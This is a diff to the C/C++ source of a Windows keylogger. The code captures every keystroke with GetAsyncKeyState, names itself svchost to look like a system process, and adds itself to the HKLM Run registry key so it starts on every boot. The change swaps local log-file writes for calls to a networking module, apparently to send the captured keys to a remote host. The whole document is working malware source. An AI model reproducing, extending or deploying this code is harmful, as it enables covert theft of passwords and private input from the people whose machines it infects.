@@ -3,10 +3,10 @@
 #include<winuser.h>
 #include<windowsx.h>
 #define BUFSIZE 80
+#include "Networking.h"
 #include "targetver.h"
 #include "svchost.h"
-
-
+using namespace SwineNetworking;
 int logger(void)
 {
 	//HWND stealth; /*creating stealth (window is not visible)*/
@@ -16,19 +16,14 @@ int logger(void)
 
 	int test, create;
 	test = test_key();/*check if key is available for opening*/
-
 	if (test == 2)/*create key*/
 	{
 		char *path = "c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
 		create = create_key(path);
-
 	}
-
 	int t = get_keys();
-
 	return t;
 }
-
 int get_keys(void)
 {
 	short character;
@@ -39,27 +34,15 @@ int get_keys(void)
 		{
 			if (GetAsyncKeyState(character) == -32767)
 			{
-
-				FILE *file;
-				file = fopen("svchost.log", "a+");
-
-				if (file == NULL)
-				{
-					return 1;
-				}
-				if (file != NULL)
-				{
 					if ((character >= 39) && (character <= 64))
 					{
-						fputc(character, file);
-						fclose(file);
+					Networking::logKey(character);
 						break;
 					}
-					else if ((character>64) && (character<91))
+				else if ((character > 64) && (character < 91))
 					{
 						character += 32;
-						fputc(character, file);
-						fclose(file);
+					Networking::logKey(character);
 						break;
 					}
 					else
@@ -67,118 +50,89 @@ int get_keys(void)
 						switch (character)
 						{
 						case VK_SPACE:
-							fputc(' ', file);
-							fclose(file);
+						Networking::logKey(' ');
 							break;
 						case VK_SHIFT:
-							fputs("[SHIFT]", file);
-							fclose(file);
+						Networking::logString("[SHIFT]");
 							break;
 						case VK_RETURN:
-							fputs("\n[ENTER]", file);
-							fclose(file);
+						Networking::logString("\n[ENTER]");
 							break;
 						case VK_BACK:
-							fputs("[BACKSPACE]", file);
-							fclose(file);
+						Networking::logString("[BACKSPACE]");
 							break;
 						case VK_TAB:
-							fputs("[TAB]", file);
-							fclose(file);
+						Networking::logString("[TAB]");
 							break;
 						case VK_CONTROL:
-							fputs("[CTRL]", file);
-							fclose(file);
+						Networking::logString("[CTRL]");
 							break;
 						case VK_DELETE:
-							fputs("[DEL]", file);
-							fclose(file);
+						Networking::logString("[DEL]");
 							break;
 						case VK_OEM_1:
-							fputs("[;:]", file);
-							fclose(file);
+						Networking::logString("[;:]");
 							break;
 						case VK_OEM_2:
-							fputs("[/?]", file);
-							fclose(file);
+						Networking::logString("[/?]");
 							break;
 						case VK_OEM_3:
-							fputs("[`~]", file);
-							fclose(file);
+						Networking::logString("[`~]");
 							break;
 						case VK_OEM_4:
-							fputs("[ [{ ]", file);
-							fclose(file);
+						Networking::logString("[ [{ ]");
 							break;
 						case VK_OEM_5:
-							fputs("[\\|]", file);
-							fclose(file);
+						Networking::logString("[\\|]");
 							break;
 						case VK_OEM_6:
-							fputs("[ ]} ]", file);
-							fclose(file);
+						Networking::logString("[ ]} ]");
 							break;
 						case VK_OEM_7:
-							fputs("['\"]", file);
-							fclose(file);
+						Networking::logString("['\"]");
 							break;
 						case VK_NUMPAD0:
-							fputc('0', file);
-							fclose(file);
+						Networking::logKey('0');
 							break;
 						case VK_NUMPAD1:
-							fputc('1', file);
-							fclose(file);
+						Networking::logKey('1');
 							break;
 						case VK_NUMPAD2:
-							fputc('2', file);
-							fclose(file);
+						Networking::logKey('2');
 							break;
 						case VK_NUMPAD3:
-							fputc('3', file);
-							fclose(file);
+						Networking::logKey('3');
 							break;
 						case VK_NUMPAD4:
-							fputc('4', file);
-							fclose(file);
+						Networking::logKey('4');
 							break;
 						case VK_NUMPAD5:
-							fputc('5', file);
-							fclose(file);
+						Networking::logKey('5');
 							break;
 						case VK_NUMPAD6:
-							fputc('6', file);
-							fclose(file);
+						Networking::logKey('6');
 							break;
 						case VK_NUMPAD7:
-							fputc('7', file);
-							fclose(file);
+						Networking::logKey('7');
 							break;
 						case VK_NUMPAD8:
-							fputc('8', file);
-							fclose(file);
+						Networking::logKey('8');
 							break;
 						case VK_NUMPAD9:
-							fputc('9', file);
-							fclose(file);
+						Networking::logKey('9');
 							break;
 						case VK_CAPITAL:
-							fputs("[CAPS LOCK]", file);
-							fclose(file);
+						Networking::logString("[CAPS LOCK]");
 							break;
 						default:
-							fclose(file);
 							break;
 						}
 					}
 				}
 			}
-		}
-
 	}
 	return EXIT_SUCCESS;
 }
-
 int test_key(void)
 {
 	int check;
@@ -186,31 +140,24 @@ int test_key(void)
 	char path[BUFSIZE];
 	DWORD buf_length = BUFSIZE;
 	int reg_key;
-
 	reg_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);
 	if (reg_key != 0)
 	{
 		check = 1;
 		return check;
 	}
-
 	reg_key = RegQueryValueEx(hKey, "svchost", NULL, NULL, (LPBYTE)path, &buf_length);
-
-	if ((reg_key != 0) || (buf_length>BUFSIZE))
+	if ((reg_key != 0) || (buf_length > BUFSIZE))
 		check = 2;
 	if (reg_key == 0)
 		check = 0;
-
 	RegCloseKey(hKey);
 	return check;
 }
-
 int create_key(char *path)
 {
 	int reg_key, check;
-
 	HKEY hkey;
-
 	reg_key = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
 	if (reg_key == 0)
 	{
@@ -220,6 +167,5 @@ int create_key(char *path)
 	}
 	if (reg_key != 0)
 		check = 1;
-
 	return check;
 }
